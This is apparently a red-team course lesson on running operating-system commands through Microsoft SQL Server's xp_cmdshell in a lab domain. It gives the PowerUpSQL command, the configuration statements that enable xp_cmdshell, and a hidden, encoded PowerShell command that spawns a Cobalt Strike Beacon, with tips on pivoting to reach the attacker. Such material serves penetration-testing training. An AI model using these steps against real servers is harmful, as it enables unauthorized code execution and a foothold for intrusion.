The **xp_cmdshell** procedure can be used to execute shell commands on the SQL server.  `Invoke-SQLOSCmd` from PowerUpSQL provides a simple means of using it.

```
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\svc_mssql
```
  
To execute manually (in Heidi/mssqlclient.py), try:

```
EXEC xp_cmdshell 'whoami';
```

However, you will see this error:


![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/xp_cmdshell-disabled.png)

  

To enumerate the current state of xp_cmdshell, use:

```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/sysconfigurations.png)

  

A value of **0** shows that xp_cmdshell is disabled. To enable it:

```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

  

Query `sys.configurations` again and the `xp_cmdshell` value should be **1**; and now `EXEC xp_cmdshell 'whoami'` will work.

> **OPSEC Alert**  
If you're going to make this type of configuration change to a target, you must ensure you set it back to its original value afterwards.  
The reason this works with `Invoke-SQLOSCmd` is because it will automatically attempt to enable xp_cmdshell if it's not already, execute the given command, and then re-disable it. This is a good example of why you should study your tools before you use them, so you know what is happening under the hood.

With command shell execution, spawning a Beacon can be as easy as a PowerShell one-liner.

```
EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
```

![](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/srv1-beacon.png)

>  There is a SQL command length limit that will prevent you from sending large payloads directly in the query, and the SQL servers cannot reach your Kali IP directly. Reverse Port Forwards and Pivot Listeners are your friends.